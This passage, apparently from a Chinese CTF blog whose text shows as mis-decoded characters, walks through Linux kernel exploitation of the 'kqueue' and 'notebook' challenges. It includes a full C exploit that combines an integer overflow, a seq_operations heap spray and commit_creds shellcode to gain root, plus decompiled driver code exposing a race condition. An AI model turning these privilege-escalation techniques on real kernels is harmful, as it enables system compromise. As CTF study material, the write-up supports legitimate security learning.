class="built_in">queue</span>)+<span class="number">1</span>)/<span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* copy all possible kqueue entries */</span></span><br><span class="line">    <span class="keyword">uint32_t</span> i=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">1</span>;i&lt;request.max_entries+<span class="number">1</span>;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!kqueue_entry || !kqueue_entry-&gt;data)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">if</span>(kqueue_entry-&gt;data &amp;&amp; request.data_size)</span><br><span class="line">            validate(<span class="built_in">memcpy</span>(new_queue,kqueue_entry-&gt;data,request.data_size));</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            err(<span class="string">&quot;[-] Internal error&quot;</span>);</span><br><span class="line">        kqueue_entry = kqueue_entry-&gt;next;</span><br><span class="line">        new_queue += <span class="built_in">queue</span>-&gt;data_size;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Mark the queue as saved */</span></span><br><span class="line">    isSaved[request.queue_idx] = <span class="literal">true</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨<code>creat_kqueue</code>ä¸­å­˜åœ¨ä¸€ä¸ªä¸€ä¸ªæ•´æ•°æº¢å‡º<code>__builtin_umulll_overflow(sizeof(queue_entry),(request.max_entries+1),&amp;space)</code>,<code>request.max_entries</code>æ˜¯ä¸€ä¸ªuint32_tå˜é‡ï¼Œæ‰€ä»¥å¦‚æœä¼ å…¥çš„æ˜¯0xffffffff,æ‹¿ç›¸åŠ å°±ä¼šå˜æˆ0ï¼Œç„¶ååœ¨<code>save_kqueue</code>ä¸­å­˜åœ¨<code>validate(memcpy(new_queue,queue-&gt;data,request.data_size));</code>ï¼Œå¦‚æœåœ¨<code>create_kqueue</code>ä¸­æ•´æ•°æº¢å‡ºäº†ï¼Œé‚£è¿™é‡Œçš„<code>new_queue</code>å°±æ˜¯ä¸€ä¸ª<code>queue</code>å¤§å°æ˜¯0x20,ä½†æ˜¯memcpyçš„å¤§å°æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œæ‰€ä»¥åˆ°äº†è¿™æ­¥å°±å¯ä»¥æº¢å‡º0x20çš„å †äº†ï¼Œæº¢å‡º0x20çš„å †æ”¹æ€ä¹ˆåˆ©ç”¨å‘¢ã€‚è¿™é‡Œå°±ç”¨åˆ°äº†ç¬¬äºŒç§æ€è·¯ã€‚</p>
<p>å½“æ‰“å¼€ä¸€ä¸ªstatæ–‡ä»¶æ¯”å¦‚(â€œ/proc/self/statâ€)çš„æ—¶å€™å°±ä¼šåœ¨å†…æ ¸åˆ†é…ä¸€ä¸ª<code>seq_operations</code>ç»“æ„ä½“ï¼Œè¿™ä¸ªç»“æ„ä½“çš„å¤§å°æ˜¯0x20,è®°å½•ç€å››ä¸ªå‡½æ•°æŒ‡é’ˆ,å½“æˆ‘ä»¬å‘statä½¿ç”¨readå‡½æ•°è¯»çš„æ—¶å€™å°±ä¼šæ‰§è¡Œ<code>seq_operations</code>ç»“æ„ä½“çš„startå‡½æ•°æŒ‡é’ˆï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åˆ©ç”¨å †å–·è®©è¿™ä¸ªç»“æ„ä½“ç½®äº<code>new_queue</code>å †å—çš„ä¸‹é¢ï¼Œç„¶åæº¢å‡ºè¦†ç›–ç¬¬ä¸€ä¸ªå‡½æ•°æŒ‡é’ˆï¼Œæœ€åread(seq_fd,data,0x20)å°±å¯ä»¥åŠ«æŒripäº†ã€‚</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>ç”±äºæ²¡æœ‰å¼€smepæ‰€ä»¥å¯ä»¥ç›´æ¥æŠŠripåŠ«æŒåˆ°ç”¨æˆ·æ€ï¼Œä½†æ³¨æ„æ­¤æ—¶çš„æ ˆä¾æ—§åœ¨å†…æ ¸ä¸Šï¼Œé‡Œé¢æœ‰å†…æ ¸ä»£ç åœ°å€ä¿¡æ¯ï¼Œå¯ä»¥é€šè¿‡å†™shellcodeä»æ ˆä¸Šå¾—åˆ°<code>commit_creds</code>å’Œ<code>prepare_kernel_cred</code>åœ°å€ï¼Œç„¶åææƒåè¿”å›ç”¨æˆ·æ€getshell</p>
<h4 id="è„šæœ¬"><a href="#è„šæœ¬" class="headerlink" title="è„šæœ¬"></a>è„šæœ¬</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdint.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell pk&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span>&#123;</span></span><br><span class="line">    <span class="keyword">uint32_t</span> max_entries;</span><br><span class="line">    <span class="keyword">uint16_t</span> data_size;</span><br><span class="line">    <span class="keyword">uint16_t</span> entry_idx;</span><br><span class="line">    <span class="keyword">uint16_t</span> queue_idx;</span><br><span class="line">    <span class="keyword">char</span>* data;</span><br><span class="line">&#125;<span class="keyword">request_t</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">create</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint32_t</span> max_entries,<span class="keyword">uint16_t</span> data_size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">request_t</span> request=&#123;</span><br><span class="line">        .max_entries=max_entries,</span><br><span class="line">        .data_size=data_size</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0xDEADC0DE</span>,&amp;request);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">edit</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint16_t</span> queue_idx,<span class="keyword">uint16_t</span> entry_idx,<span class="keyword">char</span>* data)</span></span>&#123;</span><br><span class="line">    <span class="keyword">request_t</span> request=&#123;</span><br><span class="line">        .data=data,</span><br><span class="line">        .entry_idx=entry_idx,</span><br><span class="line">        .queue_idx=queue_idx</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0xDAADEEEE</span>,&amp;request);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save</span><span class="params">(<span class="keyword">int</span> fd,<span class="keyword">uint16_t</span> queue_idx,<span class="keyword">uint32_t</span> max_entries,<span class="keyword">uint16_t</span> data_size)</span></span>&#123;</span><br><span class="line">    <span class="keyword">request_t</span> request=&#123;</span><br><span class="line">        .max_entries=max_entries,</span><br><span class="line">        .data_size=data_size,</span><br><span class="line">        .queue_idx=queue_idx</span><br><span class="line">    &#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0xB105BABE</span>,&amp;request);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">size_t</span> getshell=(<span class="keyword">size_t</span>)usr_shell;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shellcode</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov r12, qword ptr [rsp+0x8];&quot;</span></span><br><span class="line">        <span class="string">&quot;sub r12, 0x201179;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r13, r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;add r12, 0x8c140;&quot;</span></span><br><span class="line">        <span class="string">&quot;add r13, 0x8c580;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi, 0;&quot;</span></span><br><span class="line">        <span class="string">&quot;call r13;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov rdi ,rax;&quot;</span></span><br><span class="line">        <span class="string">&quot;call r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;swapgs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, user_ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, user_sp;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, user_rflags;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, user_cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov r12, getshell;&quot;</span></span><br><span class="line">        <span class="string">&quot;push r12;&quot;</span></span><br><span class="line">        <span class="string">&quot;iretq;&quot;</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> seq_fd[<span class="number">0x200</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">heap_spray</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x200</span>;i++)&#123;</span><br><span class="line">        seq_fd[i]=open(<span class="string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);</span><br><span class="line">        <span class="keyword">if</span>(!seq_fd[i])&#123;</span><br><span class="line">            <span class="built_in">puts</span>(<span class="string">&quot;/proc/self/stat open fail&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    saveStatus();</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>,(<span class="keyword">size_t</span>)shellcode);</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/dev/kqueue&quot;</span>,O_RDONLY);</span><br><span class="line">    create(fd,<span class="number">0xffffffff</span>,<span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">size_t</span> data[<span class="number">5</span>]=&#123;<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,(<span class="keyword">size_t</span>)shellcode&#125;;</span><br><span class="line">    edit(fd,<span class="number">0</span>,<span class="number">0</span>,(<span class="keyword">char</span>*)data);</span><br><span class="line">    heap_spray();</span><br><span class="line">    save(fd,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0x28</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x200</span>;i++)&#123;</span><br><span class="line">        read(seq_fd[i],data,<span class="number">0x20</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">/ $ id</span><br><span class="line">uid=1000(pwn) gid=1000 groups=1000</span><br><span class="line">/ $ ./exp</span><br><span class="line">[*] Status has been saved.</span><br><span class="line">0x400b9a</span><br><span class="line">[    8.958689] [-] kqueue data size exceed</span><br><span class="line">[    8.973254] [-] Invalid entry count</span><br><span class="line">[    8.973640] [-] Entry size <span class="built_in">limit</span> exceed</span><br><span class="line">getshelling</span><br><span class="line">[*]----getshell pk</span><br><span class="line">/ <span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0</span><br></pre></td></tr></table></figure>

<h2 id="heap-spray"><a href="#heap-spray" class="headerlink" title="heap spray"></a>heap spray</h2><p>å†…æ ¸å †å–·ï¼Œä¾æˆ‘ä¹‹è§ä¸»è¦é’ˆå¯¹çš„æ˜¯UAFå’Œå †æº¢å‡ºï¼Œåˆ©ç”¨å¤§é‡çš„å †å–·æ¥å¾—åˆ°UAFæ‰€æŒ‡çš„å †æˆ–è€…ç”³è¯·åˆ°å¯ä»¥å †æº¢å‡ºçš„å †çš„ä¸‹ä¸€ä¸ªå †ï¼ŒKqueueå°±æ˜¯è¿™ä¸ªæ€è·¯ï¼Œä¸‹é¢çš„ä¾‹é¢˜notebookæ˜¯ä¸Šä¸€ä¸ªæ€è·¯ã€‚</p>
<p><strong>å¯åŠ¨è„šæœ¬</strong></p>
<p>ä»å¯åŠ¨è„šæœ¬ä¸­å¯ä»¥çœ‹è§å¼€èµ·äº†kaslr,smep,smap,ç„¶åè®¾ç½®äº†ä¸¤ä¸ªcpu,æ¯ä¸ªcpuä¸¤ä¸ªæ ¸ï¼Œæ‰€ä»¥æœ€å¤šå¯ä»¥è·‘å››ä¸ªçº¿ç¨‹ã€‚ç„¶åä»<code>/sys/devices/system/cpu/vulnerabilities/*</code>æ–‡ä»¶ä¸­å¯ä»¥çœ‹å‡ºå¼€å¯äº†KPTI.</p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">stty intr ^]</span><br><span class="line"><span class="built_in">exec</span> timeout 300 qemu-system-x86_64 -m 64M -kernel bzImage -initrd rootfs.cpio -append <span class="string">&quot;loglevel=3 console=ttyS0 oops=panic panic=1 kaslr&quot;</span> -nographic -net user -net nic -device e1000 -smp cores=2,threads=2 -cpu kvm64,+smep,+smap -monitor /dev/null 2&gt;/dev/null -s</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Mitigation: __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline</span><br></pre></td></tr></table></figure>

<p><strong>æ–‡ä»¶ç³»ç»Ÿå¯åŠ¨è„šæœ¬</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/bin/mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:tty /dev/console</span><br><span class="line">chown root:tty /dev/ptmx</span><br><span class="line">chown root:tty /dev/tty</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line">ifup eth0 &gt; /dev/null 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">insmod notebook.ko</span><br><span class="line">cat /proc/modules | grep notebook &gt; /tmp/moduleaddr</span><br><span class="line">chmod 777 /tmp/moduleaddr</span><br><span class="line">chmod 777 /dev/notebook</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Welcome to QWB!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh</span></span><br><span class="line">setsid cttyhack setuidgid 0000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 1 -n -f</span><br></pre></td></tr></table></figure>

<p>è¿™é“é¢˜è™½ç„¶æ˜¯å †å–·ï¼Œä½†æ˜¯æœ€å…³é”®çš„è¿˜æ˜¯æ¡ä»¶ç«äº‰ï¼Œè€Œä¸”æ˜¯æˆ‘ç°åœ¨æ°´å¹³æ¥çœ‹æ˜¯æ¯”è¾ƒéš¾ä»¥å¯Ÿè§‰ä½†æ˜¯ç†è§£äº†åˆè§‰å¾—ååˆ†å‰å®³çš„åˆ©ç”¨,æ¡ä»¶ç«äº‰ä¸»è¦è¿˜æ˜¯ä½¿ç”¨<code>copy</code>å‡½æ•°ï¼Œæ¼æ´å°±å‡ºåœ¨<code>add</code>å’Œ<code>edit</code>å‡½æ•°ä¸­</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">noteedit</span><span class="params">(<span class="keyword">size_t</span> idx, <span class="keyword">size_t</span> newsize, <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r13</span></span><br><span class="line">  note *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// r12</span></span><br><span class="line">  __int64 v8; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(idx);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">-1LL</span>;</span><br><span class="line">    printk(<span class="string">&quot;[x] Edit idx out of range.\n&quot;</span>, newsize);</span><br><span class="line">    <span class="keyword">return</span> v8;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v3;</span><br><span class="line">  v5 = &amp;notebook[idx];</span><br><span class="line">  raw_read_lock(&amp;lock);</span><br><span class="line">  size = v5-&gt;size;</span><br><span class="line">  v5-&gt;size = newsize;</span><br><span class="line">  <span class="keyword">if</span> ( size == newsize )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> editout;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = (*(__int64 (__fastcall **)(<span class="keyword">void</span> *, <span class="keyword">size_t</span>, __int64))krealloc.gap0)(v5-&gt;note, newsize, <span class="number">37748928LL</span>);</span><br><span class="line">  copy_from_user(name, v4, <span class="number">0x100</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !v5-&gt;size )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;free in fact&quot;</span>);</span><br><span class="line">    v5-&gt;note = <span class="number">0LL</span>;</span><br><span class="line">    v8 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> editout;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)_virt_addr_valid(v7) )</span><br><span class="line">  &#123;</span><br><span class="line">    v5-&gt;note = (<span class="keyword">void</span> *)v7;</span><br><span class="line">    v8 = <span class="number">2LL</span>;</span><br><span class="line">editout:</span><br><span class="line">    raw_read_unlock(&amp;lock);</span><br><span class="line">    printk(<span class="string">&quot;[o] Edit success. %s edit a note.\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">return</span> v8;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(<span class="string">&quot;[x] Return ptr unvalid.\n&quot;</span>);</span><br><span class="line">  raw_read_unlock(&amp;lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">noteadd</span><span class="params">(<span class="keyword">size_t</span> idx, <span class="keyword">size_t</span> size, <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r13</span></span><br><span class="line">  note *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v6; <span class="comment">// r14</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v8; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(idx, size, buf);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">-1LL</span>;</span><br><span class="line">    printk(<span class="string">&quot;[x] Add idx out of range.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v3;</span><br><span class="line">    v5 = &amp;notebook[idx];</span><br><span class="line">    raw_read_lock(&amp;lock);</span><br><span class="line">    v6 = v5-&gt;size;</span><br><span class="line">    v5-&gt;size = size;</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x60</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5-&gt;size = v6;</span><br><span class="line">      v8 = <span class="number">-2LL</span>;</span><br><span class="line">      printk(<span class="string">&quot;[x] Add size out of range.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      copy_from_user(name, v4, 